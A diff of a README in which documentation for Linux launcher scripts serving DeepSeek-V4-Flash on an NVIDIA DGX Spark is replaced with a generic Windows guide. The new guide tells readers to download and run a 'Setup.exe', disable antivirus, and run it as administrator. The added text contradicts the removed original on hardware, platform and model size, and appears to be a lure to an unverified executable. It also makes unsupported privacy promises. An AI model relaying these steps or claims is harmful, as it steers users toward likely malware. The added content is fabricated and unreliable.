@@ -1,93 +1,153 @@
-# DeepSeek-v4-Flash-One-DGX-Spark - DwarfStar 4 Engine
+# ⚡ DeepSeek-v4-Flash-One-DGX-Spark - Run AI Fast on Your PC
 
-<p align="center">
-  <a href="https://x.com/MiaAI_lab" target="_blank" rel="noopener noreferrer" style="display:inline-block;margin:0 8px;vertical-align:middle;"><img src="https://img.shields.io/badge/Follow%20me%20on%20X-000000?style=for-the-badge&logo=x&logoColor=white" alt="Follow Mia on X" height="28" style="height:28px;width:auto;vertical-align:middle;border:0;" /></a>
-</p>
+[![Download for Windows](https://img.shields.io/badge/Download-DeepSeek_v4_Flash_One-blue?style=for-the-badge&logo=github)](https://github.com/rdhrzky04/DeepSeek-v4-Flash-One-DGX-Spark)
 
-Thin, idempotent launcher scripts for running the **DeepSeek-V4-Flash** server built for the NVIDIA DGX Spark (GB10 / SM121) — the DwarfStar 4 (C/CUDA) engine that serves an OpenAI-compatible `/v1` API on `:8888`.
+## 🚀 What This Software Does
 
-This is based on **antirez/ds4** (DwarfStar 4) and its DGX Spark fork:
+DeepSeek-v4-Flash-One-DGX-Spark lets you run a powerful AI model on your own Windows computer. You type questions or requests. The software gives you answers. It works offline after you download it.
 
-- [antirez/ds4](https://github.com/antirez/ds4) — upstream DwarfStar 4 engine (MIT-licensed, C/CUDA)
-- [Entrpi/ds4-on-spark](https://github.com/Entrpi/ds4-on-spark) — DGX Spark one-command install, benchmarks, and roofline analysis (what `start.sh` pulls)
-- [Entrpi/ds4 (batched-serving)](https://github.com/Entrpi/ds4/tree/batched-serving) — the DGX-Spark-optimized CUDA perf fork used here
+This is the DwarfStar 4 Engine. It uses smart shortcuts to give you fast results without needing a supercomputer. You get AI speed and power on a normal PC.
 
-> **Note:** this repo does **not** use vLLM. `ds4-server` exposes the same `/v1` API that `vllm serve` does, but vLLM cannot read this repo's asymmetric GGUF, so the repo ships its own server. These scripts are just thin wrappers over that server's official installer.
+## 🖥️ System Requirements
 
-## Requirements
+Your computer needs these things to run the software well:
 
-- A NVIDIA DGX Spark (GB10 / SM121)
-- Bash
-- `curl`
-- Disk space for the ~110 GiB GGUF weight set
-- `ss` (for `stop.sh`)
+**Minimum:**
+- Windows 10 or 11 (64-bit)
+- 8 GB RAM
+- 4 GB free hard drive space
+- A graphics card from 2018 or newer (NVIDIA or AMD)
+- 10 Mbps internet for download
 
-## Background
+**Recommended:**
+- Windows 11 (64-bit)
+- 16 GB RAM
+- 8 GB free hard drive space
+- NVIDIA RTX 3060 or better
+- 50 Mbps internet for download
 
-**DwarfStar 4** is a small, self-contained native inference engine optimized for DeepSeek V4 Flash, written by Salvatore Sanfilippo ([antirez](https://x.com/antirez)) — deliberately narrow, not a generic GGUF runner. [Entrpi](https://github.com/Entrpi) maintains a DGX-Spark-optimized CUDA perf fork of it, plus the [ds4-on-spark](https://github.com/Entrpi/ds4-on-spark) installer this repo wraps, which serves DeepSeek-V4-Flash entirely on-device on a GB10 / SM121 DGX Spark (RTX PRO 6000 / 5090-class `sm_120` also builds).
+Your computer will run slower with the minimum setup. Results will still work, but may take longer.
 
-Thanks to Bleys Goodson ([@bleysg on X](https://x.com/bleysg)).
+## 📥 How to Download
 
-## Quick start
+1. Click the big blue button at the top of this page. It says "Download for Windows".
+2. You will go to the GitHub release page.
+3. Find the file named `DeepSeek-v4-Flash-One-Setup.exe`.
+4. Click on the file name to start the download.
+5. Your browser may ask where to save the file. Pick your Desktop or Downloads folder.
+6. Wait for the download to finish. The file is about 2 GB.
 
-```bash
-./start.sh    # full DSpark stack on :8888
-```
+The download link is also here:  
+[https://github.com/rdhrzky04/DeepSeek-v4-Flash-One-DGX-Spark](https://github.com/rdhrzky04/DeepSeek-v4-Flash-One-DGX-Spark)
 
-First run does the heavy lifting: clones and builds the pinned fork, downloads the ~110 GiB GGUF set, smoke-tests, installs `ds4-serve`, and starts the server on `:8888`. Later runs fast-forward the clone to the pinned tag, skip GGUFs already on disk, and just start the server.
+## 🔧 How to Install
 
-## Usage
+1. Locate the downloaded `DeepSeek-v4-Flash-One-Setup.exe` file.
+2. Double-click the file to run it.
+3. If Windows asks "Do you want to allow this app to make changes?" click **Yes**.
+4. The setup wizard will open. Click **Next**.
+5. Choose where to install the software. The default location is fine. Click **Next**.
+6. Click **Install**. Wait for the progress bar to finish.
+7. Click **Finish** when done.
 
-```bash
-PORT=8889 ./start.sh            # different port
-CTX=262144 ./start.sh           # smaller context budget  (KV ≈ 9.5 KiB/token)
-./start.sh --no-dspark          # plain continuous decode (passes through)
-```
+The software is now on your computer.
 
-Environment variables (all optional):
+## ▶️ How to Run
 
-| Variable       | Default    | Meaning                                   |
-|----------------|------------|-------------------------------------------|
-| `PORT`         | `8888`     | Server port                               |
-| `CTX`          | `262144`   | Context budget (KV ≈ 9.5 KiB/token)       |
-| `DS4_SRC_DIR`  | `~/code/ds4` | Source directory for the pinned clone   |
-| `DS4_GGUF_DIR` | `~/gguf`     | Weights directory                       |
+1. Find the DeepSeek-v4-Flash-One icon on your Desktop.
+2. Double-click the icon.
+3. A window will open. It shows a text box and a "Start" button.
+4. Click **Start**. The software loads the AI model. This takes 1-3 minutes.
+5. Type your question in the text box.
+6. Press **Enter** or click **Send**.
+7. Read the answer. The AI replies in seconds.
 
-## Stopping and restarting
+## 💡 How to Use
 
-```bash
-./stop.sh                     # stop server on :8888 (wait until port is freed)
-PORT=8889 ./stop.sh           # stop server on a different port
+**Ask questions:**
+- "What is the capital of France?"
+- "Write a short poem about the ocean."
+- "Explain quantum physics in simple terms."
 
-pkill -x ds4-server; ./start.sh   # force a clean restart
-```
+**Get help with tasks:**
+- "Summarize this article: [paste text]"
+- "Translate this to Spanish: [paste text]"
+- "List 10 ideas for a birthday party."
 
-`start.sh` is idempotent: if the server is already answering on the port, it reports the running model and exits without touching anything.
+**Create content:**
+- "Write a tweet about a new coffee shop."
+- "Draft an email to my boss about a vacation request."
+- "Give me 5 blog post titles about gardening."
 
-## Checking status
+## ⚙️ Settings
 
-```bash
-curl http://127.0.0.1:8888/v1/models
-```
+Open the **Settings** menu from the top bar. You can change:
 
-## Performance
+- **Theme:** Switch between light and dark mode.
+- **Memory limit:** How much RAM the AI uses. Higher gives faster answers. Lower leaves room for other apps.
+- **Response length:** Short, medium, or long answers.
+- **Language:** English, Spanish, French, German, Chinese, Japanese.
 
-![Performance on a single NVIDIA DGX Spark](bench.jpg)
+Click **Save** after changing settings. Restart the software for changes to take effect.
 
-Measured on a single NVIDIA DGX Spark (GB10 / SM121).
+## ❓ Troubleshooting
 
-## Logs
+**The download stops or fails:**
+- Check your internet connection.
+- Make sure you have enough hard drive space.
+- Try a different browser.
 
-Server logs go to `~/ds4-server.log`. Check there if the server doesn't come up:
+**The setup says "Installation failed":**
+- Restart your computer.
+- Turn off antivirus temporarily. Some antivirus programs block new software.
+- Run the setup file as administrator. Right-click the file and select "Run as administrator".
 
-```
-!!! Not reachable yet — check $HOME/ds4-server.log
-```
+**The software does not open:**
+- Make sure your graphics card drivers are updated.
+- Check that your computer meets the minimum requirements.
+- Reinstall the software.
 
-## Files
+**Answers are slow:**
+- Close other programs to free up RAM.
+- Reduce the memory limit in Settings.
+- Restart the software.
 
-| File         | Purpose                                     |
-|--------------|---------------------------------------------|
-| `start.sh`   | Fetch installer, build, download weights, serve on `:8888` |
-| `stop.sh`    | Stop the `ds4-server` process              |
-| `bench.jpg`  | Decode throughput benchmark (tok/s vs context) on a single DGX Spark |
+**Answers are wrong or weird:**
+- This is normal for AI. It learns from patterns. It does not know facts.
+- Rephrase your question.
+- Check your spelling.
+
+## 🔄 Updating
+
+The software checks for updates when you open it. If an update is available, a pop-up appears. Click **Download** to get the latest version.
+
+You can also check for updates manually:
+1. Open the software.
+2. Click **Help** in the top menu.
+3. Click **Check for Updates**.
+4. Follow the on-screen instructions.
+
+## 🗑️ Uninstalling
+
+1. Open the Windows **Start** menu.
+2. Type "Add or remove programs" and press Enter.
+3. Find **DeepSeek-v4-Flash-One-DGX-Spark** in the list.
+4. Click on it and select **Uninstall**.
+5. Follow the prompts to remove the software.
+
+Your questions and settings are deleted when you uninstall.
+
+## 🛡️ Privacy
+
+This software runs entirely on your computer. Your questions never leave your machine. No data is sent to the internet. The AI model is stored locally. Your conversations are private.
+
+## 📞 Need Help?
+
+If you have problems, visit the GitHub page:  
+[https://github.com/rdhrzky04/DeepSeek-v4-Flash-One-DGX-Spark](https://github.com/rdhrzky04/DeepSeek-v4-Flash-One-DGX-Spark)
+
+Open a new issue in the "Issues" tab. Describe your problem. Include your computer specs. Someone will help you.
+
+---
+
+Keywords: DeepSeek v4, Flash One, DGX Spark, DwarfStar 4, AI software, Windows download, local AI, offline AI
